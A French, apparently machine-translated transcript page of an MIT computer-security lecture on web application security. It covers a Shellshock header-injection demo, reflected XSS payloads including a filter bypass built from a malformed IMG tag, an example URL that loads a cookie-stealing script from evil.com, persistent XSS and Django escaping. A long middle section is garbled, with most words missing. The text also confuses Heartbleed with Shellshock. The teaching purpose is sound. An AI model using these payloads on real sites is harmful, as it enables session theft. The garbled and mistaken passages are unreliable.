<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>💆🏻 👩🏿‍🎤 👋🏾 Cours MIT "Sécurité des systèmes informatiques". Conférence 9: Sécurité des applications Web, partie 1 🚆 🤷🏾 🚲</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Institut de technologie du Massachusetts. Cours magistral # 6.858. "Sécurité des systèmes informatiques." Nikolai Zeldovich, James Mickens. 2014 année...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Cours MIT "Sécurité des systèmes informatiques". Conférence 9: Sécurité des applications Web, partie 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ua-hosting/blog/424289/"><h3>  Institut de technologie du Massachusetts.  Cours magistral # 6.858.  "Sécurité des systèmes informatiques."  Nikolai Zeldovich, James Mickens.  2014 année </h3><br>  Computer Systems Security est un cours sur le développement et la mise en œuvre de systèmes informatiques sécurisés.  Les conférences couvrent les modèles de menace, les attaques qui compromettent la sécurité et les techniques de sécurité basées sur des travaux scientifiques récents.  Les sujets incluent la sécurité du système d'exploitation (OS), les fonctionnalités, la gestion du flux d'informations, la sécurité des langues, les protocoles réseau, la sécurité matérielle et la sécurité des applications Web. <br><br>  Cours 1: «Introduction: modèles de menace» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 2: «Contrôle des attaques de pirates» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 3: «Débordements de tampon: exploits et protection» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 4: «Séparation des privilèges» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 5: «D'où viennent les systèmes de sécurité?» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> <br>  Conférence 6: «Opportunités» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 7: «Native Client Sandbox» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 8: «Modèle de sécurité réseau» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  Conférence 9: «Sécurité des applications Web», <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 3</a> <a name="habracut"></a><br><br>  Commençons la deuxième conférence de notre impressionnante série d'histoires sur la sécurité Web.  Je voudrais immédiatement procéder à une démonstration rapide d'exemples, car vous savez que nos démos ne fonctionnent presque jamais.  J'espère que vous ne voyez pas d'écran vierge aujourd'hui. <br><br>  L'idée de base est que je voudrais d'abord vous montrer un exemple d'une erreur Shellshock dont vous avez peut-être déjà entendu parler.  C'était un sujet assez populaire dans la littérature sur la sécurité informatique. <br><br><img src="https://habrastorage.org/webt/kk/h0/hz/kkh0hzlvc4krqxabzmnwigajxo4.jpeg"><br><br>  Les gens attribuent à une erreur Heartbleed une note maximale de 10 sur une échelle de danger 10. Ils considèrent que c'est l'erreur la plus dangereuse contre laquelle le système de sécurité devrait se protéger.  Je pensais que ce serait une excellente idée de vous montrer une histoire vivante de ce problème que vous pouvez raconter à vos parents afin qu'ils comprennent que les études au Massachusetts Institute of Technology valent la peine. <br><br>  Alors, quelle est l'idée principale de l'erreur Shellshock?  C'est un très bon exemple de la raison pour laquelle il est si difficile de créer des applications Web sécurisées qui couvrent plusieurs technologies, plusieurs langues, plusieurs systèmes d'exploitation, etc.  Par conséquent, l'idée principale est que Shellshock utilise le fait qu'un attaquant peut créer une requête http spéciale sur le serveur et gérer les en-têtes de cette requête.  J'ai écrit un exemple très simple au tableau. <br>  Supposons qu'un attaquant veuille envoyer une demande GET à un CGI sur le sujet de la recherche de chats, car c'est exactement ce que les gens recherchent toujours sur Internet (je plaisante).  Par conséquent, il y aura un point d'interrogation et une sorte d'en-tête d'hôte standard avec une URL, par exemple, example.com: <br><br>  OBTENIR /querry.cgi?  recherche = chats <br>  Hôte: example.com <br>  Personnalisé - en-tête: personnalisé - valeur <br><br>  Notez maintenant qu'un attaquant peut également spécifier des en-têtes personnalisés.  Par exemple, je souhaite trouver un type d'en-tête spécifique à l'application appelé Custom-header pour spécifier une valeur personnalisée, car l'application Web peut définir des fonctionnalités qui ne peuvent pas être exprimées à l'aide de simples en-têtes HTTP prédéfinis.  Alors, tout cela semble plutôt inoffensif. <br>  Mais au final, ce qui se passe, c'est que beaucoup de ces serveurs Web pour le traitement des scripts CGI acceptent réellement ces valeurs personnalisées de l'en-tête Custom-value et les utilisent pour définir les variables d'environnement Bash.  Autrement dit, ils utiliseront cet en-tête personnalisé pour créer un en-tête personnalisé pour le nom de la variable Bash, ils prendront cette valeur personnalisée fournie par l'attaquant et l'utiliseront comme valeur de la variable Bash.  Une fois cette variable définie, le serveur CGI effectuera un traitement du contexte de cet environnement. <br><br>  Et c'est mauvais parce que les serveurs Web ne devraient pas prendre de valeurs arbitraires à partir de ces choses «sales» aléatoires.  Ainsi, dans un exemple spécifique d'une erreur Shellshock, ce qui se passe est que si vous donnez à la variable Bash une valeur malveillante, une forme de folie peut commencer. <br><br><img src="https://habrastorage.org/webt/pt/e_/26/pte_26a2d3abmngljp3z9rwoiwa.jpeg"><br><br>  Fondamentalement, cette définition malveillante d'une fonction est choisie dans le langage de script Bash, et vous ne devriez pas être dérangé par les spécificités de ce processus.  Mais le fait est que si le paramètre Bash était correctement défini, cette partie de / bin / id ne serait pas exécutée.  Vous venez donc de définir une sorte de fonction stupide qui ne fait rien et met fin au processus de requête. <br><br>  Cependant, cette séquence de caractères confond l'analyseur Bash; il semble trébucher sur ce non-sens situé après la barre oblique.  Et puis il dit: "Oh, je pourrais continuer à analyser et exécuter certaines commandes ici, non?"  Et dans ce cas, il exécute simplement la commande bin / id, qui affiche des informations sur l'utilisateur.  Mais l'essence de la vulnérabilité est qu'au lieu de bin / id, vous pouvez mettre absolument n'importe quel code ici! <br><br>  Je vais donner un exemple très simple que vous verrez à l'écran.  Il s'agit d'un serveur Python très simple, le plus simple que vous puissiez imaginer.  J'utilise ici la méthode GET.  Cette méthode signifie l'itération sur tous les en-têtes HTTP dans la demande. <br><br><img src="https://habrastorage.org/webt/w4/3c/fw/w43cfwwaqjmmjxm78zug-oecus4.jpeg"><br><br><img src="https://habrastorage.org/webt/1m/mr/jf/1mmrjfhbdbu6-kpevbe24bsmhpg.jpeg"><br><br>  Ici, dans l'en-tête, nous avons une valeur pour la variable K et une valeur pour la requête V. Dans ce cas, GET affiche simplement les en-têtes qu'il trouve. <br><br>  Et puis il va faire quelque chose de très stupide - faire un appel système et définir la valeur du shell directement sur la valeur indiquée dans l'en-tête.  C'est donc toute la racine de la vulnérabilité. <br><br>  Si je passe à l'onglet suivant et lance le serveur Web de la victime, nous constatons qu'il est prêt à accepter les demandes. <br><br><img src="https://habrastorage.org/webt/rk/jt/zg/rkjtzg52m6abnpspbgoyltcpzmc.jpeg"><br><br>  Ensuite, je peux écrire mon client Shellshock spécial - il se trouve dans l'onglet suivant. <br><br><img src="https://habrastorage.org/webt/jv/jh/hc/jvjhhchuelxbtmdnkrdos_apl_0.jpeg"><br><br>  En fait, c'est assez simple - je viens de définir une de ces lignes attack.str malveillantes, donc elle a d'abord de telles valeurs "courbes".  Et puis je sais juste que côté serveur tout se fera désormais selon ma volonté. <br><br>  Dans ce cas, j'ai utilisé quelque chose d'inoffensif - en écho "Je possède votre voiture".  Mais il pourrait y avoir n'importe quoi.  Vous pouvez exécuter un autre shell Bash avec le paramètre «echo ATTACKER CMD», c'est-à-dire la véritable commande de l'attaquant, ce qui peut être très dangereux. <br><br>  J'ai donc défini les en-têtes et la demande de l'utilisateur, puis j'utilise Python pour créer une connexion HTTP et l'envoyer simplement au serveur.  Que se passe-t-il finalement?  J'utilise mon client Shellshock ici. <br><br><img src="https://habrastorage.org/webt/li/y5/pf/liy5pfnb9rji1s51vi7vvwwn4bs.jpeg"><br><br>  Vous voyez, l'erreur 404 est apparue ici, car peu importe le fichier que j'ai demandé, j'insère juste ici une sorte d'index qui n'existe pas en HTML.  Mais si vous regardez ici, dans le deuxième onglet, où nous montrons le serveur Web de la victime qui a accepté de se connecter via le port 8282, nous verrons qu'il a reçu mes messages "Je possède votre voiture" et ATTACKER CMD. <br><br><img src="https://habrastorage.org/webt/6t/kf/yp/6tkfyptepbhu83ggs2shp_20dys.jpeg"><br><br>  Parce que dès que le serveur de la victime a reçu cet en-tête, il a immédiatement défini les valeurs de la variable Bash et, par conséquent, la commande ATTACKER CMD a été lancée.  Est-ce clair? <br><br>  <b>Public:</b> cela se produit-il si un programme commence par un tel titre? <br><br>  <b>Professeur:</b> oui.  Ainsi, les détails du fonctionnement de l'attaque dépendent de l'apparence de votre serveur Web, par exemple, que vous travailliez avec Apache ou non.  Cet exemple est un peu tiré par les cheveux, car j'ai en fait créé un autre shell Bash, défini une variable de shell et puis seulement commencé le processus.  Mais vous pouvez imaginer que si vous créez d'autres processus pour chaque connexion entrante, vous pouvez définir directement la variable d'environnement. <br><br>  <b>Public:</b> Ainsi, si vous revenez au code du serveur web, il semble qu'il existe une vulnérabilité bien pire que Shellshock.  Parce que vous pouvez effectuer un appel système et exécuter la commande simplement en définissant l'en-tête personnalisé sur autre chose, et je n'aurais pas à utiliser l'erreur Shellshock dans cet exemple. <br><br>  <b>Professeur:</b> oui, c'est vrai, dans ce serveur Web particulier, que j'ai écrit uniquement à titre d'exemple, il y a une chose à laquelle on ne peut faire confiance pour rien.  Mais si ici nous n'avions pas Python, mais Apache, alors nous pourrions directement définir la valeur de l'environnement pour un service particulier en utilisant le paramètre nth set.  Mais il existe des serveurs comme celui-ci qui créent un processus distinct et font quelque chose de très similaire à l'exemple donné. <br><br><img src="https://habrastorage.org/webt/js/s4/zz/jss4zz4vwyw6dqz-4s0kzwlr-uy.jpeg"><br><br>  Un autre exemple que je voulais vous donner est l'exemple du scriptage intersite.  Le bug de Shellshock était une sorte d'exemple de l'importance de la désinfection du contenu.  Nous avons discuté du fait que vous ne devez pas simplement accepter les contributions de personnes aléatoires et les utiliser directement dans des équipes de tout type. <br><br>  Les scripts intersites sont un autre exemple montrant pourquoi quelque chose pourrait mal se passer.  Dans cet exemple, j'ai un autre serveur CGI simple écrit en Python. <br><br><img src="https://habrastorage.org/webt/lp/oo/aw/lpooaw-togbyuns6zaxta0lp6ei.jpeg"><br><br>  Il s'agit du descripteur qui est exécuté lorsqu'une demande est reçue du client.  J'ai imprimé quelques en-têtes ici pour la réponse, et ma réponse sera du texte HTML.  Il s'avère que les navigateurs disposent de certains mécanismes de sécurité pour essayer de prévenir l'attaque que je vais vous montrer.  Par conséquent, j'ai permis de désactiver certains des mécanismes de cette protection en plaçant cette barre de titre au début. <br><br>  Le script CGI accède ensuite à tous les champs et demandes CGI, en commençant par la ligne form = cgi.FieldStorage ().  Imaginez que tout ce qui se trouve dans la ligne après ce point d'interrogation représente le titre et les paramètres de notre exemple: <br><br>  OBTENIR /querry.cgi?  recherche = chats <br>  Hôte: example.com <br>  Personnalisé - en-tête: personnalisé - valeur <br><br>  Ensuite, le script cgi fait une chose très simple - il imprime immédiatement la valeur de quelque chose qui vient de l'attaquant.  C'est la même idée de base, et c'est une mauvaise idée, car cette fonction d'impression imprime la valeur résultante directement dans le HTML lui-même. <br><br>  Ici, les événements suivants peuvent se produire.  Supposons que j'ai un tas de requêtes que je veux exécuter.  Dans cette première demande, je mets simplement la valeur du message à Bonjour, c'est-à-dire que je vais à l'adresse de la première ligne. <br><br><img src="https://habrastorage.org/webt/q2/xl/ng/q2xlngmnjiyfdvdytmh2gfdoymq.jpeg"><br><br>  Par conséquent, si je vais sur ma page, je verrai le mot bonjour dessus, car le serveur accepte directement ce que je lui transmets et imprime «bonjour».  Donc pas de surprise. <br><br><img src="https://habrastorage.org/webt/1t/0n/ak/1t0nakmsjq1emmcqj03bs9sosq0.jpeg"><br><br>  Je comprends que je peux vraiment y passer du code HTML arbitraire, et si je définis le format d'en-tête sur h1, c'est-à-dire que j'enverrai la deuxième ligne se terminant par bonjour au serveur, cela changera également sur la page - vous voyez, le style de mot a changé pour le style d'en-tête h1.  Donc ça marche, je tape les valeurs directement dans la page. <br><br><img src="https://habrastorage.org/webt/gm/qy/mv/gmqymv3fbxpjzkxa5wwdvijx7vu.jpeg"><br><br>  Génial, maintenant nous sommes en affaires, et c'est cool.  Maintenant, ajoutons simplement le code JavaScript, c'est-à-dire que nous exécuterons la troisième ligne préparée par moi dans le navigateur, où un certain script est inséré, qui s'exécute après le paramètre d'alerte ("XSS"). <br><br>  Alors maintenant, nous voyons un écran vide.  Il semble que nous n'ayons pas réussi, car aucune sortie n'est visible, et je n'ai remarqué aucun avertissement. <br><br><img src="https://habrastorage.org/webt/hd/mo/qr/hdmoqr8xk5ehtmumjddzqwrquns.jpeg"><br><br>  Mais si je regarde la sortie du serveur Web, je verrai que le serveur Web lui-même n'a pas réellement reçu cette balise de script finale.  Il semble que le navigateur lui-même ait détecté quelque chose de mal, bien que j'aie essayé de désactiver le filtre XSS.  C'est donc assez intéressant.  Plus tard, nous examinerons de plus près ce mécanisme de protection, mais pour l'instant, je noterai que le navigateur essaie de résister à une attaque de script intersite. <br><br>  Mais vous pouvez profiter du fait que HTML, CSS et JavaScript sont des langages extrêmement complexes, et ils sont écrits d'une manière difficile à comprendre.  J'en profiterai et utiliserai la dernière, quatrième ligne de mon entrée, en la plaçant dans la barre d'adresse du navigateur.  Il s'agit d'une chaîne d'attaque contenant une URL non valide.  Il inclut l'URL de l'image &lt;IMG “” ”&gt; et la balise de script”&gt; et ne peut en fait pas être analysé.  Par conséquent, à la réception d'une telle ligne, le navigateur est simplement confus et affiche des informations à l'écran: «La page à 127.0.0.1:8282 dit: XSS».  Ainsi, la détection de script intersite intégrée ne fonctionne pas réellement. <br><br><img src="https://habrastorage.org/webt/zh/sa/df/zhsadfxqyr1nqiwiy8atytitmou.jpeg"><br><br>  Si nous cliquons sur le bouton «OK», nous aurons juste une page vierge.  Mais si vous regardez son contenu, nous verrons des citations et des crochets incompréhensibles qui viennent de nulle part. <br><br><img src="https://habrastorage.org/webt/za/qi/yp/zaqiyp6lxm9damgqbidbi7ess3u.jpeg"><br><br>  Cependant, du point de vue de l'attaquant, la page endommagée n'a pas d'importance, car nous avons vu un avertissement, ce qui signifie que le code a été lancé.  Et il pourrait être utilisé pour voler des cookies ou faire quelque chose comme ça. <br><br>  <b>Public:</b> quel est l'aspect intersite? <br><br>  <b>Professeur: L'</b> aspect intersite est que si un attaquant peut convaincre un utilisateur d'aller sur une URL, comme dans cet exemple, alors c'est lui qui détermine le contenu du message.  C'est lui qui crée l'avertissement XSS ou quelque chose comme ça.  Essentiellement, ce qui se passe, c'est que la page de la victime exécute du code au nom de quelqu'un qui ne gère pas cette page. <br><br>  Je vous ai donc montré deux démonstrations rapides du monde «sale» dans lequel nous vivons.  Alors pourquoi les scripts intersites sont-ils si courants?  Pourquoi ces problèmes sont-ils si importants?  La raison en est que les sites Web deviennent de plus en plus dynamiques et qu'ils souhaitent héberger plusieurs contenus générés par les utilisateurs ou inclure du contenu provenant d'autres domaines.  Pensez, par exemple, à la section des commentaires d'un article de presse, ces commentaires proviennent de personnes peu fiables - d'utilisateurs.  D'une manière ou d'une autre, ces sites devraient déterminer quelles sont les règles pour combiner de telles choses. <br><br>  Les sites Web peuvent contenir des documents utilisateur, tels que des documents Google ou Office 365. Tous ces documents proviennent de personnes peu fiables, mais ils doivent en quelque sorte s'entendre les uns avec les autres et avec la grande infrastructure de Google ou Microsoft. <br><br>  Quels types de scénarios de sécurité intersites pouvons-nous utiliser?  Un type de protection consiste en des filtres de script intersite dans le navigateur lui-même.  Ces filtres tenteront de détecter d'éventuelles attaques de script intersite.  Et nous avons vu l'un de ces filtres en action - c'était le troisième exemple du scénario que nous avons examiné. <br>  Supposons que vous ayez l'URL <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">foo.com/?q=</a> &lt;script src = "evil.com/cookie stealer.js"&gt;.  Autrement dit, cette adresse exécute un script qui redirige l'utilisateur vers un site malveillant et lui vole des cookies. <br><br><img src="https://habrastorage.org/webt/no/hf/b_/nohfb_nyupptbxwj4luk1whqgpw.jpeg"><br><br>  Ainsi, le navigateur refusera de l'exécuter et l'astuce de cet attaquant ne fonctionnera pas.  La raison est simple - le navigateur a juste vérifié s'il y avait une <code>&lt;script&gt;</code> intégrée dans cette URL et, l'ayant trouvée, a interdit de cliquer sur ce lien.  Ainsi, c'est une heuristique très simple pour savoir si quelque chose de dangereux se produit, car aucun développeur normal ne mettra de telles choses dans l'adresse.  Vous pouvez configurer les options de configuration de votre navigateur pour activer ou désactiver de telles choses.  Cela est parfois utile pour les tests si vous voulez simplement saisir rapidement et sans trop de vérification certaines données JavaScript.  Mais généralement, cette vérification dans le navigateur est activée par défaut. <br><br>  Par exemple, Chrome et IE ont un filtre intégré qui examine la valeur de l'URL dans la barre d'adresse et recherche des choses similaires.  Et s'ils sont là, le navigateur peut essayer de les supprimer complètement ou de vider la source à l'intérieur de &lt;&gt;.  Il existe de nombreuses méthodes d'analyse heuristique basées sur les navigateurs qui devraient détecter de telles choses.  Et si vous regardez le site Web OWASP, il existe des exemples d'utilisation d'une telle heuristique pour détecter les scripts intersites et des exemples de la façon de contourner ce filtre. <br><br>  Vous savez, c'était très drôle, car au début, comme exemple pour notre conférence, j'ai fait quelque chose de similaire et cela n'a pas fonctionné.  Ensuite, j'ai regardé dans la feuille de triche OWASP et j'ai trouvé la quatrième option qui fonctionnait, c'était un exemple avec une analyse cassée de l'adresse d'image img. <br><br>  Ainsi, le principal problème, qui ne vous permet pas de simplement vous fier aux filtres de navigateur intégrés, est qu'il existe de nombreuses façons différentes de forcer les analyseurs CSS et HTML à analyser certains contenus de manière incorrecte.  Les solutions embarquées ne sont donc pas parfaites, elles ne couvrent pas toutes les vulnérabilités. <br><br>  <b>Public:</b> Mais n'est-ce pas la responsabilité du navigateur de vérifier de telles choses? <br><br>  <b>Professeur:</b> Je veux dire le cas lorsque le navigateur est sur un serveur proxy et que le proxy fait quelque chose comme indiqué dans cet exemple.  Autrement dit, les filtres intégrés ont du sens, car il peut y avoir de nombreux analyseurs à l'intérieur du navigateur, et ces filtres sont utilisés pour protéger les couches de gestionnaire à l'intérieur du navigateur. <br><br>  <b>Public:</b> Je pense que nous pouvons dire qu'il est de la responsabilité du développeur Web, et non de l'utilisateur, de vérifier ces choses. <br><br>  <b>Professeur:</b> dans un certain sens, nous pourrions dire que sous Unix ou Windows, il existe également des processus dont le développeur de logiciels, et non l'utilisateur, devrait s'occuper, et le développeur devrait s'assurer que ces choses restent isolées.  Mais en réalité, le système d'exploitation et le matériel jouent également un rôle important, car sinon, on ne pourrait pas faire confiance aux programmes créés par des développeurs aléatoires.  Mais fondamentalement, vous avez raison.  En fait, des frameworks comme Django ou quelque chose de similaire essaient de vous aider à contourner certains de ces problèmes. <br><br>  D'une manière ou d'une autre, les filtres ne sont pas une solution idéale et ne peuvent pas empêcher ce que l'on appelle des attaques de script intersites persistantes ou persistantes, XSS persistantes.  C'est une sorte de réflexion, car le code du script «vit» simplement dans l'URL.  Dès que l'utilisateur a fermé cette URL, l'attaque a pris fin. <br><br>  Mais imaginez qu'un utilisateur a placé du code HTML malveillant dans la section des commentaires de votre site.         ,          .           ,      . <br><br><img src="https://habrastorage.org/webt/ve/bq/zh/vebqzhebjjzb__fbvhmhga2tav0.jpeg"><br><br>  ,     –   .           HTML-   . <br><br>    ?  - ,          .        HTML,   ,       .         . <br><br> <b>:</b>  ,    , ,  ,           -   ? <br><br> <b>:</b>    ,      .   ,     — post.  ,   ,   XML HTTP . <br><br> <b>:</b>      ,          ,  … <br><br> <b>:</b> ,     ,      .  ,                 .      - ,    . <br><br>  ,    ,         . <br><br>       ,   « HTTP »,  HTTP-only cookie.     ,     ,    JavaScript        cookie.  ,  ,          , : «,    ,  JavaScript,     cookie»!         - . <br><br>     ,        ,    .     ,      .  ,    JavaScript     cookie,     - , ,  URL-  -   , , buy.com.      ,   , ,  Ferrari,        attacker,    . <br><br><img src="https://habrastorage.org/webt/3q/nz/v2/3qnzv2vakvuorhnvqzgzonxubvw.jpeg"><br><br>    ,  JavaScript,      cookie,  ,       URL-.  ,     CSRF ,      . <br><br>   ,     ,      ,   .    ,         ,    . ,  -   ,   ,     ,  Google, Office 365   .         . , Google              googleusercontent.com.      ,  Gmail   . -,      25-   . <br><br><img src="https://habrastorage.org/webt/xz/b0/r7/xzb0r7kx8ebddto0pynf4cuoyn4.jpeg"><br><br>       ?  ,          -     ,              google.com.     ,              google.com.          . <br><br>  ,     –     .   ,       -,    ,     .       ,                 .   —   Django.   -, ,          -. <br><br><img src="https://habrastorage.org/webt/hh/tk/em/hhtkemhitqft99764mtwlvwzssi.jpeg"><br><br> Django     ,      ,           .          –   .             CSS   ,       . ,        .  Django    ,    :   ,   . <br><br><img src="https://habrastorage.org/webt/m7/t-/tt/m7t-tthgw-nmrsbhzx0z0r_8wwi.jpeg"><br><br>    -.    ,       Django,  Django : «,     -, ,  ,    CGI».    Django     ,       ,     .  -   CGI0,    ,         . <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cependant, Django fait beaucoup mieux - il désinfecte le contenu utilisateur, car il attend de lui une astuce. </font><font style="vertical-align: inherit;">Il place simplement immédiatement la valeur de la variable de nom ici, et l'encode de telle manière que ce contenu ne puisse jamais sortir du contexte HTML et exécuter du code JavaScript ou quelque chose comme ça. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26:25 min</font></font><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Cours MIT "Sécurité des systèmes informatiques".</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Conférence 9: «Sécurité des applications Web», partie 2</a> <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/6HhmIlbE0l0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  La version complète du cours est disponible <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  Merci de rester avec nous.  Aimez-vous nos articles?  Vous voulez voir des matériaux plus intéressants?  Soutenez-nous en passant une commande ou en le recommandant à vos amis, une <b>réduction de 30% pour les utilisateurs Habr sur un analogue unique de serveurs d'entrée de gamme que nous avons inventés pour vous:</b> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Toute la vérité sur VPS (KVM) E5-2650 v4 (6 cœurs) 10 Go DDR4 240 Go SSD 1 Gbps à partir de 20 $ ou comment diviser le serveur?</a>  (les options sont disponibles avec RAID1 et RAID10, jusqu'à 24 cœurs et jusqu'à 40 Go de DDR4). <br><br>  <b>VPS (KVM) E5-2650 v4 (6 cœurs) 10 Go DDR4 240 Go SSD 1 Gbit / s jusqu'en décembre gratuitement</b> en payant pour une période de six mois, vous pouvez commander <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  <b>Dell R730xd 2 fois moins cher?</b>  Nous avons seulement <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">2 x Intel Dodeca-Core Xeon E5-2650v4 128 Go DDR4 6x480 Go SSD 1 Gbps 100 TV à partir de 249 $</a> aux Pays-Bas et aux États-Unis!</b>  Pour en savoir plus sur la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">création d'un bâtiment d'infrastructure.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">classe utilisant des serveurs Dell R730xd E5-2650 v4 